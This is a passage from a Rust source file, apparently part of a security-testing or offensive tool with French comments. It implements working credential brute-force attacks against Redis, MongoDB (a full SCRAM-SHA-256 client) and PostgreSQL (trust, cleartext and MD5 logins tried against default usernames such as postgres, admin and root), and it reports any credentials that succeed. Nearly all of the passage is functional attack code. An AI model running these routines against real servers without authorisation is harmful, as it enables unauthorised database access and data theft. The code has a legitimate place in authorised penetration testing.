                Err(_) => AttemptOutcome::Error,
            }
        },
    )
    .await;
    total_tried += tried;
    for (_, pass, proof) in found {
        successes.push(BruteResult {
            service: "redis".into(),
            host: host.into(),
            port,
            username: "".into(),
            password: pass,
            success: true,
            proof: Some(proof),
            duration_ms: start.elapsed().as_millis(),
        });
    }

    BruteReport {
        target,
        service: "redis".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

async fn try_redis_auth(
    host: &str,
    port: u16,
    password: Option<&str>,
    timeout: Duration,
) -> Result<Option<String>, String> {
    let addr = format!("{}:{}", host, port);
    let mut stream = tokio::time::timeout(timeout, TcpStream::connect(&addr))
        .await
        .map_err(|_| "timeout".to_string())?
        .map_err(|e| e.to_string())?;

    let mut buf = vec![0u8; 2048];

    if let Some(pass) = password {
        // AUTH <password>
        let auth_cmd = format!("*2\r\n$4\r\nAUTH\r\n${}\r\n{}\r\n", pass.len(), pass);
        tokio::time::timeout(timeout, stream.write_all(auth_cmd.as_bytes()))
            .await
            .map_err(|_| "write".to_string())?
            .map_err(|e| e.to_string())?;
        let n = tokio::time::timeout(timeout, stream.read(&mut buf))
            .await
            .map_err(|_| "read".to_string())?
            .map_err(|e| e.to_string())?;
        let resp = String::from_utf8_lossy(&buf[..n]).to_string();
        if resp.starts_with("+OK") {
            // Verify with INFO
            let _ = stream.write_all(b"*1\r\n$4\r\nINFO\r\n").await;
            let n2 = tokio::time::timeout(timeout, stream.read(&mut buf))
                .await
                .ok()
                .and_then(|r| r.ok())
                .unwrap_or(0);
            let info = String::from_utf8_lossy(&buf[..n2]).to_string();
            let ver = info
                .lines()
                .find(|l| l.starts_with("redis_version:"))
                .unwrap_or("redis_version:?");
            return Ok(Some(format!(
                "Redis AUTH OK with password '{}' | {}",
                pass, ver
            )));
        }
        return Ok(None);
    }

    // No auth: try PING directly
    tokio::time::timeout(timeout, stream.write_all(b"*1\r\n$4\r\nPING\r\n"))
        .await
        .map_err(|_| "write".to_string())?
        .map_err(|e| e.to_string())?;
    let n = tokio::time::timeout(timeout, stream.read(&mut buf))
        .await
        .map_err(|_| "read".to_string())?
        .map_err(|e| e.to_string())?;
    let resp = String::from_utf8_lossy(&buf[..n]).to_string();
    if resp.starts_with("+PONG") {
        // Collect version
        let _ = stream.write_all(b"*1\r\n$4\r\nINFO\r\n").await;
        let n2 = tokio::time::timeout(Duration::from_secs(2), stream.read(&mut buf))
            .await
            .ok()
            .and_then(|r| r.ok())
            .unwrap_or(0);
        let info = String::from_utf8_lossy(&buf[..n2]).to_string();
        let ver = info
            .lines()
            .find(|l| l.starts_with("redis_version:"))
            .unwrap_or("redis_version:?");
        let role = info
            .lines()
            .find(|l| l.starts_with("role:"))
            .unwrap_or("role:?");
        return Ok(Some(format!("Redis NO AUTH required | {} | {}", ver, role)));
    }
    if resp.contains("NOAUTH") {
        return Ok(None); // Auth required but no password provided
    }
    Ok(None)
}

// ─────────────────────────────────────────────────────────────────────────────
// 5. MongoDB — OP_MSG (opcode 2013) + SCRAM-SHA-256 (RFC 5802 / 7677)
// ─────────────────────────────────────────────────────────────────────────────

const MONGO_OP_MSG: i32 = 2013;
const MONGO_MAX_MESSAGE: usize = 4 * 1024 * 1024;
/// Base logique où sont déclarés les comptes SCRAM interrogés par défaut.
const MONGO_AUTH_DB: &str = "admin";

/// Sous-ensemble BSON strictement nécessaire aux commandes d'authentification.
/// Le parsing est **borné** : toute incohérence renvoie `None` (jamais de panic).
#[derive(Debug, Clone, PartialEq)]
enum Bson {
    Double(f64),
    Str(String),
    Doc(Vec<(String, Bson)>),
    Array(Vec<Bson>),
    Binary(u8, Vec<u8>),
    Bool(bool),
    Int32(i32),
    Int64(i64),
    Null,
}

fn bson_put_element(out: &mut Vec<u8>, key: &str, val: &Bson) {
    out.push(match val {
        Bson::Double(_) => 0x01,
        Bson::Str(_) => 0x02,
        Bson::Doc(_) => 0x03,
        Bson::Array(_) => 0x04,
        Bson::Binary(..) => 0x05,
        Bson::Bool(_) => 0x08,
        Bson::Null => 0x0A,
        Bson::Int32(_) => 0x10,
        Bson::Int64(_) => 0x12,
    });
    out.extend_from_slice(key.as_bytes());
    out.push(0x00);
    match val {
        Bson::Double(d) => out.extend_from_slice(&d.to_le_bytes()),
        Bson::Str(s) => {
            out.extend_from_slice(&((s.len() + 1) as i32).to_le_bytes());
            out.extend_from_slice(s.as_bytes());
            out.push(0x00);
        }
        Bson::Doc(d) => out.extend_from_slice(&bson_encode(d)),
        Bson::Array(a) => {
            let items: Vec<(String, Bson)> = a
                .iter()
                .enumerate()
                .map(|(i, v)| (i.to_string(), v.clone()))
                .collect();
            out.extend_from_slice(&bson_encode(&items));
        }
        Bson::Binary(sub, data) => {
            out.extend_from_slice(&(data.len() as i32).to_le_bytes());
            out.push(*sub);
            out.extend_from_slice(data);
        }
        Bson::Bool(b) => out.push(if *b { 1 } else { 0 }),
        Bson::Null => {}
        Bson::Int32(i) => out.extend_from_slice(&i.to_le_bytes()),
        Bson::Int64(i) => out.extend_from_slice(&i.to_le_bytes()),
    }
}

fn bson_encode(doc: &[(String, Bson)]) -> Vec<u8> {
    let mut body = Vec::new();
    for (k, v) in doc {
        bson_put_element(&mut body, k, v);
    }
    body.push(0x00);
    let mut out = Vec::with_capacity(body.len() + 4);
    out.extend_from_slice(&((body.len() + 4) as i32).to_le_bytes());
    out.extend_from_slice(&body);
    out
}

/// Lit une clé C-string terminée par 0x00, bornée par `end`.
fn bson_read_key(buf: &[u8], end: usize, i: &mut usize) -> Option<String> {
    let start = *i;
    while *i < end && buf[*i] != 0 {
        *i += 1;
    }
    if *i >= end {
        return None;
    }
    let s = String::from_utf8_lossy(&buf[start..*i]).to_string();
    *i += 1;
    Some(s)
}

/// Lit un document BSON à partir de `*i` et avance `*i` jusqu'à sa fin.
fn bson_parse_doc_at(buf: &[u8], i: &mut usize) -> Option<Vec<(String, Bson)>> {
    let start = *i;
    if buf.len() < start + 5 {
        return None;
    }
    let len = i32::from_le_bytes(buf[start..start + 4].try_into().ok()?);
    if len < 5 {
        return None;
    }
    let end = start.checked_add(len as usize)?;
    if end > buf.len() {
        return None;
    }

    let mut p = start + 4;
    let mut out = Vec::new();
    while p + 1 < end {
        let kind = buf[p];
        p += 1;
        let key = bson_read_key(buf, end, &mut p)?;
        let val = match kind {
            0x01 => {
                if p + 8 > end {
                    return None;
                }
                let d = f64::from_le_bytes(buf[p..p + 8].try_into().ok()?);
                p += 8;
                Bson::Double(d)
            }
            0x02 => {
                if p + 4 > end {
                    return None;
                }
                let n = i32::from_le_bytes(buf[p..p + 4].try_into().ok()?);
                if n < 1 {
                    return None;
                }
                let n = n as usize;
                p += 4;
                if p + n > end {
                    return None;
                }
                let s = String::from_utf8_lossy(&buf[p..p + n - 1]).to_string();
                p += n;
                Bson::Str(s)
            }
            0x03 => Bson::Doc(bson_parse_doc_at(buf, &mut p)?),
            0x04 => {
                let sub = bson_parse_doc_at(buf, &mut p)?;
                Bson::Array(sub.into_iter().map(|(_, v)| v).collect())
            }
            0x05 => {
                if p + 5 > end {
                    return None;
                }
                let n = i32::from_le_bytes(buf[p..p + 4].try_into().ok()?);
                if n < 0 {
                    return None;
                }
                let sub = buf[p + 4];
                p += 5;
                let n = n as usize;
                if p + n > end {
                    return None;
                }
                let data = buf[p..p + n].to_vec();
                p += n;
                Bson::Binary(sub, data)
            }
            0x08 => {
                if p >= end {
                    return None;
                }
                let b = buf[p] != 0;
                p += 1;
                Bson::Bool(b)
            }
            0x0A => Bson::Null,
            0x10 => {
                if p + 4 > end {
                    return None;
                }
                let v = i32::from_le_bytes(buf[p..p + 4].try_into().ok()?);
                p += 4;
                Bson::Int32(v)
            }
            0x12 => {
                if p + 8 > end {
                    return None;
                }
                let v = i64::from_le_bytes(buf[p..p + 8].try_into().ok()?);
                p += 8;
                Bson::Int64(v)
            }
            // Types courants non exploités : sautés proprement (taille fixe).
            0x07 => {
                if p + 12 > end {
                    return None;
                }
                p += 12;
                Bson::Null
            } // ObjectId
            0x09 | 0x11 => {
                if p + 8 > end {
                    return None;
                }
                p += 8;
                Bson::Null
            } // date / timestamp
            // Type inconnu ou variable non géré : abandon explicite.
            _ => return None,
        };
        out.push((key, val));
    }
    if buf[end - 1] != 0x00 {
        return None;
    } // terminateur obligatoire
    *i = end;
    Some(out)
}

fn bson_get<'a>(doc: &'a [(String, Bson)], key: &str) -> Option<&'a Bson> {
    doc.iter().find(|(k, _)| k == key).map(|(_, v)| v)
}

fn bson_str(doc: &[(String, Bson)], key: &str) -> Option<String> {
    match bson_get(doc, key) {
        Some(Bson::Str(s)) => Some(s.clone()),
        _ => None,
    }
}

fn bson_bin(doc: &[(String, Bson)], key: &str) -> Option<Vec<u8>> {
    match bson_get(doc, key) {
        Some(Bson::Binary(_, d)) => Some(d.clone()),
        _ => None,
    }
}

fn bson_i32(doc: &[(String, Bson)], key: &str) -> Option<i32> {
    match bson_get(doc, key) {
        Some(Bson::Int32(v)) => Some(*v),
        Some(Bson::Int64(v)) => Some(*v as i32),
        Some(Bson::Double(d)) => Some(*d as i32),
        _ => None,
    }
}

fn bson_bool(doc: &[(String, Bson)], key: &str) -> Option<bool> {
    match bson_get(doc, key) {
        Some(Bson::Bool(b)) => Some(*b),
        Some(Bson::Int32(v)) => Some(*v != 0),
        Some(Bson::Int64(v)) => Some(*v != 0),
        Some(Bson::Double(d)) => Some(*d != 0.0),
        _ => None,
    }
}

/// Le champ `ok` est `1.0` (double) en cas de succès ; absent ⇒ considéré vrai.
fn bson_ok(doc: &[(String, Bson)]) -> bool {
    match bson_get(doc, "ok") {
        None => true,
        Some(Bson::Double(d)) => *d != 0.0,
        Some(Bson::Bool(b)) => *b,
        Some(Bson::Int32(v)) => *v != 0,
        Some(Bson::Int64(v)) => *v != 0,
        _ => false,
    }
}

/// Trame OP_MSG à section unique (kind 0) — la forme utilisée par le driver
/// pour toute commande depuis MongoDB 3.6.
fn mongo_op_msg(request_id: i32, body: &[u8]) -> Vec<u8> {
    let total = 16 + 4 + 1 + body.len();
    let mut m = Vec::with_capacity(total);
    m.extend_from_slice(&(total as i32).to_le_bytes());
    m.extend_from_slice(&request_id.to_le_bytes());
    m.extend_from_slice(&0i32.to_le_bytes()); // responseTo
    m.extend_from_slice(&MONGO_OP_MSG.to_le_bytes());
    m.extend_from_slice(&0u32.to_le_bytes()); // flagBits
    m.push(0x00); // section kind 0
    m.extend_from_slice(body);
    m
}

/// Extrait le document de corps d'une trame OP_MSG (gère le CRC optionnel).
fn mongo_op_msg_body(frame: &[u8]) -> Option<Vec<(String, Bson)>> {
    if frame.len() < 5 {
        return None;
    }
    let flags = u32::from_le_bytes(frame[0..4].try_into().ok()?);
    let end = if flags & 0x1 != 0 {
        frame.len().checked_sub(4)?
    } else {
        frame.len()
    };
    if end < 5 {
        return None;
    }
    let mut i = 4usize;
    if i < end {
        let kind = frame[i];
        i += 1;
        // Seule la section « corps » (0) porte le document de réponse ; une
        // séquence de documents (1) n'est jamais attendue en réponse à `sasl*`.
        if kind == 0x00 {
            return bson_parse_doc_at(&frame[..end], &mut i);
        }
    }
    None
}

/// Envoie une commande OP_MSG et retourne le document de réponse.
async fn mongo_command(
    stream: &mut TcpStream,
    req_id: i32,
    cmd: &[(String, Bson)],
    timeout: Duration,
) -> Result<Vec<(String, Bson)>, ()> {
    let frame = mongo_op_msg(req_id, &bson_encode(cmd));
    write_all_to(stream, &frame, timeout).await?;

    let header = read_n(stream, 16, timeout).await?;
    let opcode = i32::from_le_bytes(header[12..16].try_into().map_err(|_| ())?);
    if opcode != MONGO_OP_MSG {
        return Err(());
    }
    let len = i64::from(i32::from_le_bytes(header[0..4].try_into().map_err(|_| ())?));
    if len < 16 || len as usize > MONGO_MAX_MESSAGE {
        return Err(());
    }
    let body = read_n(stream, len as usize - 16, timeout).await?;
    mongo_op_msg_body(&body).ok_or(())
}

// ── Primitives SCRAM ────────────────────────────────────────────────────────

/// PBKDF2-HMAC-SHA256 (RFC 2898) — le nombre d'itérations est imposé par le
/// serveur (`i=`), il n'est donc jamais fixé en dur.
// `Hmac::new_from_slice` accepte **toute** longueur de clé : la conversion ne
// peut jamais échouer (cf. doc `hmac`).
#[allow(clippy::expect_used)]
fn pbkdf2_hmac_sha256(password: &[u8], salt: &[u8], iterations: u32, dklen: usize) -> Vec<u8> {
    use hmac::{Hmac, Mac};
    type HmacSha256 = Hmac<sha2::Sha256>;

    let mut out = Vec::with_capacity(dklen);
    let mut block: u32 = 1;
    while out.len() < dklen {
        let mut mac = HmacSha256::new_from_slice(password).expect("HMAC accepte toute clé");
        mac.update(salt);
        mac.update(&block.to_be_bytes());
        let mut u = mac.finalize().into_bytes();
        let mut t = u;
        for _ in 1..iterations.max(1) {
            let mut mac = HmacSha256::new_from_slice(password).expect("HMAC accepte toute clé");
            mac.update(&u);
            u = mac.finalize().into_bytes();
            for (a, b) in t.iter_mut().zip(u.iter()) {
                *a ^= *b;
            }
        }
        out.extend_from_slice(&t);
        block += 1;
    }
    out.truncate(dklen);
    out
}

// `Hmac::new_from_slice` accepte toute longueur de clé : infaillible.
#[allow(clippy::expect_used)]
fn hmac_sha256(key: &[u8], data: &[u8]) -> Vec<u8> {
    use hmac::{Hmac, Mac};
    let mut mac = Hmac::<sha2::Sha256>::new_from_slice(key).expect("HMAC accepte toute clé");
    mac.update(data);
    mac.finalize().into_bytes().to_vec()
}

fn sha256(data: &[u8]) -> Vec<u8> {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(data);
    h.finalize().to_vec()
}

/// Échappement SCRAM du nom d'utilisateur (RFC 5802 §5.1).
fn scram_escape_username(user: &str) -> String {
    user.replace('=', "=3D").replace(',', "=2C")
}

/// Nonce client imprimable (base64 — n'utilise jamais la virgule).
fn scram_client_nonce() -> String {
    use base64::Engine;
    use rand::RngCore;
    let mut raw = [0u8; 24];
    rand::thread_rng().fill_bytes(&mut raw);
    base64::engine::general_purpose::STANDARD.encode(raw)
}

/// Extrait `(nonce serveur, sel décodé, itérations)` du message « server-first ».
fn scram_parse_server_first(msg: &str) -> Option<(String, Vec<u8>, u32)> {
    use base64::Engine;
    let (mut nonce, mut salt, mut iters) = (None, None, None);
    for part in msg.split(',') {
        let (k, v) = part.split_once('=')?;
        match k {
            "r" => nonce = Some(v.to_string()),
            "s" => salt = base64::engine::general_purpose::STANDARD.decode(v).ok(),
            "i" => iters = v.parse::<u32>().ok(),
            // Extension obligatoire non comprise ⇒ échec (RFC 5802 §5.1).
            "m" => return None,
            _ => {}
        }
    }
    let (nonce, salt, iters) = (nonce?, salt?, iters?);
    if iters == 0 || iters > 1_000_000 {
        return None;
    }
    Some((nonce, salt, iters))
}

/// Calcule la preuve SCRAM-SHA-256 et la signature serveur attendue.
/// Retourne `(client-final-message, ServerSignature)`.
fn scram_sha256_client_proof(
    user: &str,
    password: &str,
    client_nonce: &str,
    server_first: &str,
) -> Option<(String, Vec<u8>)> {
    use base64::Engine;

    let (server_nonce, salt, iters) = scram_parse_server_first(server_first)?;
    // Le nonce serveur doit prolonger le nonce client (anti-rejeu).
    if !server_nonce.starts_with(client_nonce) {
        return None;
    }

    let client_first_bare = format!("n={},r={}", scram_escape_username(user), client_nonce);
    let client_final_wo_proof = format!("c=biws,r={}", server_nonce);
    let auth_message = format!(
        "{},{},{}",
        client_first_bare, server_first, client_final_wo_proof
    );

    // SASLprep n'est pas appliqué : le mot de passe est utilisé tel quel en
    // UTF-8 (identique pour tout mot de passe ASCII, cas de très loin dominant).
    let salted = pbkdf2_hmac_sha256(password.as_bytes(), &salt, iters, 32);
    let client_key = hmac_sha256(&salted, b"Client Key");
    let stored_key = sha256(&client_key);
    let client_sig = hmac_sha256(&stored_key, auth_message.as_bytes());
    if client_sig.len() != client_key.len() {
        return None;
    }
    let proof: Vec<u8> = client_key
        .iter()
        .zip(client_sig.iter())
        .map(|(a, b)| a ^ b)
        .collect();

    let b64 = base64::engine::general_purpose::STANDARD;
    let client_final = format!("{},p={}", client_final_wo_proof, b64.encode(&proof));

    let server_key = hmac_sha256(&salted, b"Server Key");
    let server_sig = hmac_sha256(&server_key, auth_message.as_bytes());
    Some((client_final, server_sig))
}

/// Vérifie `v=` du « server-final-message » contre la signature attendue.
fn scram_verify_server_final(msg: &str, expected: &[u8]) -> bool {
    use base64::Engine;
    let mut v = None;
    for part in msg.split(',') {
        if let Some(rest) = part.strip_prefix("v=") {
            v = Some(rest.to_string());
        }
    }
    match v.and_then(|s| base64::engine::general_purpose::STANDARD.decode(s).ok()) {
        Some(sig) => sig == expected,
        None => false,
    }
}

/// Convertit une réponse d'erreur MongoDB (code 18 = AuthenticationFailed) en
/// verdict de tentative — sans jamais fabriquer de succès.
fn mongo_auth_failure(reply: &[(String, Bson)]) -> AttemptOutcome {
    let msg = bson_str(reply, "errmsg").unwrap_or_default();
    let code = bson_i32(reply, "code").unwrap_or(0);
    if detect_lockout(&msg).is_some() {
        return AttemptOutcome::Locked(format!("MongoDB code {} — {}", code, msg.trim()));
    }
    AttemptOutcome::Failure
}

// ── Vérification « sans authentification » ──────────────────────────────────

/// `listDatabases` exige le privilège `listDatabases` : un `ok:1` sans
/// credentials prouve réellement que l'autorisation est désactivée — contrairement
/// à `hello`/`isMaster`, toujours accessible même sur une instance protégée.
pub async fn check_mongodb_auth(host: &str, port: u16, timeout: Duration) -> Option<BruteResult> {
    let start = std::time::Instant::now();
    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut s)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return None;
    };

    let cmd = vec![
        ("listDatabases".to_string(), Bson::Int32(1)),
        ("$db".to_string(), Bson::Str(MONGO_AUTH_DB.to_string())),
    ];
    let reply = mongo_command(&mut s, 1, &cmd, timeout).await.ok()?;
    if !bson_ok(&reply) {
        return None;
    }

    let n = match bson_get(&reply, "databases") {
        Some(Bson::Array(a)) => a.len(),
        _ => 0,
    };
    Some(BruteResult {
        service: "mongodb".into(),
        host: host.into(),
        port,
        username: "".into(),
        password: "(no auth)".into(),
        success: true,
        proof: Some(format!(
            "MongoDB — `listDatabases` accepté sans authentification ({} base(s) listée(s))",
            n
        )),
        duration_ms: start.elapsed().as_millis(),
    })
}

// ── Bruteforce SCRAM ────────────────────────────────────────────────────────

async fn try_mongodb_login(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut s)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    let client_nonce = scram_client_nonce();
    let client_first_bare = format!("n={},r={}", scram_escape_username(user), client_nonce);
    let client_first = format!("n,,{}", client_first_bare);

    let start_cmd = vec![
        ("saslStart".to_string(), Bson::Int32(1)),
        (
            "mechanism".to_string(),
            Bson::Str("SCRAM-SHA-256".to_string()),
        ),
        (
            "payload".to_string(),
            Bson::Binary(0, client_first.into_bytes()),
        ),
        ("autoAuthorize".to_string(), Bson::Int32(1)),
        (
            "options".to_string(),
            Bson::Doc(vec![("skipEmptyExchange".to_string(), Bson::Bool(true))]),
        ),
        ("$db".to_string(), Bson::Str(MONGO_AUTH_DB.to_string())),
    ];
    let Ok(reply) = mongo_command(&mut s, 1, &start_cmd, timeout).await else {
        return AttemptOutcome::Error;
    };
    if !bson_ok(&reply) {
        return mongo_auth_failure(&reply);
    }

    let Some(conv_id) = bson_i32(&reply, "conversationId") else {
        return AttemptOutcome::Error;
    };
    let Some(payload) = bson_bin(&reply, "payload") else {
        return AttemptOutcome::Error;
    };
    let server_first = String::from_utf8_lossy(&payload).to_string();

    let Some((client_final, server_sig)) =
        scram_sha256_client_proof(user, pass, &client_nonce, &server_first)
    else {
        return AttemptOutcome::Error;
    };

    let cont = vec![
        ("saslContinue".to_string(), Bson::Int32(1)),
        ("conversationId".to_string(), Bson::Int32(conv_id)),
        (
            "payload".to_string(),
            Bson::Binary(0, client_final.into_bytes()),
        ),
        ("$db".to_string(), Bson::Str(MONGO_AUTH_DB.to_string())),
    ];
    let Ok(reply) = mongo_command(&mut s, 2, &cont, timeout).await else {
        return AttemptOutcome::Error;
    };
    if !bson_ok(&reply) {
        return mongo_auth_failure(&reply);
    }

    let mut server_final = bson_bin(&reply, "payload").unwrap_or_default();
    let mut done = bson_bool(&reply, "done").unwrap_or(false);

    // Sans `skipEmptyExchange`, le serveur clôt par un tour supplémentaire.
    let mut req_id = 3;
    while !done && req_id < 7 {
        let empty = vec![
            ("saslContinue".to_string(), Bson::Int32(1)),
            ("conversationId".to_string(), Bson::Int32(conv_id)),
            ("payload".to_string(), Bson::Binary(0, Vec::new())),
            ("$db".to_string(), Bson::Str(MONGO_AUTH_DB.to_string())),
        ];
        let Ok(reply) = mongo_command(&mut s, req_id, &empty, timeout).await else {
            return AttemptOutcome::Error;
        };
        if !bson_ok(&reply) {
            return mongo_auth_failure(&reply);
        }
        if let Some(p) = bson_bin(&reply, "payload") {
            if !p.is_empty() {
                server_final = p;
            }
        }
        done = bson_bool(&reply, "done").unwrap_or(false);
        req_id += 1;
    }

    if !done {
        return AttemptOutcome::Failure;
    }

    // Double preuve : `ok:1` **et** signature serveur vérifiée cryptographiquement.
    let text = String::from_utf8_lossy(&server_final).to_string();
    if !scram_verify_server_final(&text, &server_sig) {
        return AttemptOutcome::Error;
    }

    AttemptOutcome::Success(format!(
        "MongoDB db={} — {}:{} authentifié (SCRAM-SHA-256, signature serveur vérifiée)",
        MONGO_AUTH_DB, user, pass
    ))
}

pub async fn brute_mongodb(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);

    let (mut total_tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "mongodb",
        &target,
        |user, pass| async move { try_mongodb_login(host, port, &user, &pass, cfg.timeout).await },
    )
    .await;

    let mut successes: Vec<BruteResult> = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result(
                "mongodb",
                host,
                port,
                u,
                p,
                proof,
                start.elapsed().as_millis(),
            )
        })
        .collect();

    // Aucun credential requis : l'instance accepte les commandes sans auth.
    if successes.is_empty() {
        total_tried += 1;
        if let Some(r) = check_mongodb_auth(host, port, cfg.timeout).await {
            successes.push(r);
        }
    }

    BruteReport {
        target,
        service: "mongodb".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 6. PostgreSQL Bruteforce
// ─────────────────────────────────────────────────────────────────────────────

pub async fn brute_postgresql(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);
    let mut successes = Vec::new();
    let mut total_tried = 0usize;

    // Test trust auth first (postgres user, no password)
    total_tried += 1;
    if let Some(r) = try_pg_trust(host, port, "postgres", cfg.timeout).await {
        successes.push(r);
        if cfg.stop_on_success {
            return BruteReport {
                target,
                service: "postgresql".into(),
                total_tried,
                successes,
                duration_ms: start.elapsed().as_millis(),
            };
        }
    }

    // Cleartext/MD5 bruteforce : les paires de la wordlist sont essayées sur
    // chaque utilisateur courant (les rôles par défaut des SGBD).
    let pg_users = ["postgres", "admin", "root", "test", "dba"];
    let mut candidates = Vec::new();
    for user in &pg_users {
        for (_, pass) in cfg.credential_pairs().iter().take(50) {
            candidates.push((user.to_string(), pass.clone()));
        }
    }

    let (tried, found) = run_credential_attempts(
        candidates,
        cfg,
        "postgresql",
        &target,
        |user, pass| async move { try_pg_password(host, port, &user, &pass, cfg.timeout).await },
    )
    .await;
    total_tried += tried;
    for (user, pass, proof) in found {
        successes.push(brute_result(
            "postgresql",
            host,
            port,
            user,
            pass,
            proof,
            start.elapsed().as_millis(),
        ));
    }

    BruteReport {
        target,
        service: "postgresql".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

/// Extrait le texte d'un ErrorResponse PostgreSQL (champs 'S' sévérité et
/// 'M' message), utilisé pour repérer un verrouillage de compte.
fn pg_error_text(buf: &[u8]) -> String {
    let mut out = String::new();
    let mut i = 5usize; // 'E' + longueur 4 octets
    while i < buf.len() && buf[i] != 0 {
        let ftype = buf[i];
        i += 1;
        let start = i;
        while i < buf.len() && buf[i] != 0 {
            i += 1;
        }
        if ftype == b'M' || ftype == b'S' {
            out.push_str(&String::from_utf8_lossy(&buf[start..i]));
            out.push(' ');
        }
        i += 1; // NUL terminateur du champ
    }
    out.trim().to_string()
}

async fn try_pg_trust(host: &str, port: u16, user: &str, timeout: Duration) -> Option<BruteResult> {
    let start = std::time::Instant::now();
    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut s)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return None;
    };

    let user_bytes = user.as_bytes();
    let mut body = Vec::new();
    body.extend_from_slice(&[0u8; 4]); // placeholder for length
    body.extend_from_slice(&[0x00, 0x03, 0x00, 0x00]); // protocol 3.0
    body.extend_from_slice(b"user\0");
    body.extend_from_slice(user_bytes);
    body.push(0);
    body.extend_from_slice(b"database\0");
    body.extend_from_slice(user_bytes);
    body.push(0);
    body.extend_from_slice(&[0, 0]);
    let len = (body.len() as u32).to_be_bytes();
    body[0..4].copy_from_slice(&len);

    if tokio::time::timeout(timeout, s.write_all(&body))
        .await
        .is_err()
    {
        return None;
    }

    let mut resp = [0u8; 64];
    let Ok(Ok(n)) = tokio::time::timeout(timeout, s.read(&mut resp)).await else {
        return None;
    };

    // 'R' AuthenticationRequest — type 0 = AuthenticationOk (trust)
    if n >= 9 && resp[0] == b'R' {
        let auth_type = u32::from_be_bytes([resp[5], resp[6], resp[7], resp[8]]);
        if auth_type == 0 {
            return Some(BruteResult {
                service: "postgresql".into(),
                host: host.into(),
                port,
                username: user.into(),
                password: "(trust auth — no password)".into(),
                success: true,
                proof: Some(format!(
                    "PostgreSQL TRUST auth for user '{}' — AuthType=0 (OK without password)",
                    user
                )),
                duration_ms: start.elapsed().as_millis(),
            });
        }
    }
    None
}

async fn try_pg_password(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut s)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    // StartupMessage
    let user_bytes = user.as_bytes();
    let mut body = Vec::new();
    body.extend_from_slice(&[0u8; 4]);
    body.extend_from_slice(&[0x00, 0x03, 0x00, 0x00]);
    body.extend_from_slice(b"user\0");
    body.extend_from_slice(user_bytes);
    body.push(0);
    body.extend_from_slice(b"database\0");
    body.extend_from_slice(user_bytes);
    body.push(0);
    body.extend_from_slice(&[0, 0]);
    let len = (body.len() as u32).to_be_bytes();
    body[0..4].copy_from_slice(&len);

    if tokio::time::timeout(timeout, s.write_all(&body))
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }

    let mut resp = [0u8; 256];
    let Ok(Ok(n)) = tokio::time::timeout(timeout, s.read(&mut resp)).await else {
        return AttemptOutcome::Error;
    };
    if n > 0 && resp[0] == b'E' {
        return pg_error_outcome(&resp[..n]);
    }

    if n < 9 || resp[0] != b'R' {
        return AttemptOutcome::Failure;
    }
    let auth_type = u32::from_be_bytes([resp[5], resp[6], resp[7], resp[8]]);

    // AuthType 3 = CleartextPassword
    if auth_type == 3 {
        let pass_msg = {
            let pb = pass.as_bytes();
            let mut m = Vec::with_capacity(6 + pb.len());
            m.push(b'p'); // PasswordMessage
            let plen = (pb.len() as u32 + 5).to_be_bytes();
            m.extend_from_slice(&plen);
            m.extend_from_slice(pb);
            m.push(0);
            m
        };
        if tokio::time::timeout(timeout, s.write_all(&pass_msg))
            .await
            .is_err()
        {
            return AttemptOutcome::Error;
        }
        let Ok(Ok(n2)) = tokio::time::timeout(timeout, s.read(&mut resp)).await else {
            return AttemptOutcome::Error;
        };
        if n2 > 0 && resp[0] == b'E' {
            return pg_error_outcome(&resp[..n2]);
        }
        if n2 > 0 && resp[0] == b'R' {
            let at2 = u32::from_be_bytes([resp[5], resp[6], resp[7], resp[8]]);
            if at2 == 0 {
                return AttemptOutcome::Success(format!(
                    "PostgreSQL cleartext auth OK: user={} pass={}",
                    user, pass
                ));
            }
        }
    }

    // AuthType 5 = MD5 — send salted MD5 hash
    if auth_type == 5 && n >= 13 {
        let salt = &resp[9..13];
        let md5_pass = pg_md5_password(user, pass, salt);
        let pass_msg = {
            let pb = md5_pass.as_bytes();
            let mut m = Vec::with_capacity(6 + pb.len());
            m.push(b'p');
            let plen = ((pb.len() as u32) + 5).to_be_bytes();
            m.extend_from_slice(&plen);
            m.extend_from_slice(pb);
            m.push(0);
            m
        };
        if tokio::time::timeout(timeout, s.write_all(&pass_msg))
            .await
            .is_err()
        {
            return AttemptOutcome::Error;
        }
        let Ok(Ok(n2)) = tokio::time::timeout(timeout, s.read(&mut resp)).await else {
            return AttemptOutcome::Error;
        };
        // AuthType 0 = AuthenticationOk, 'E' = Error. Vérifier le code
        // d'authentification et pas seulement le préfixe 'R' : un nouveau
        // défi d'authentification (type 3 ou 5) commence aussi par 'R'.
        if n2 > 0 && resp[0] == b'E' {
            return pg_error_outcome(&resp[..n2]);
        }
        if n2 >= 9
            && resp[0] == b'R'
            && u32::from_be_bytes([resp[5], resp[6], resp[7], resp[8]]) == 0
        {
            return AttemptOutcome::Success(format!(
                "PostgreSQL MD5 auth OK: user={} pass={}",
                user, pass
            ));
        }
    }

    AttemptOutcome::Failure
}

/// Convertit une ErrorResponse PostgreSQL en issue d'authentification, en
/// distinguant un refus normal d'un verrouillage / blocage d'hôte.
fn pg_error_outcome(err: &[u8]) -> AttemptOutcome {
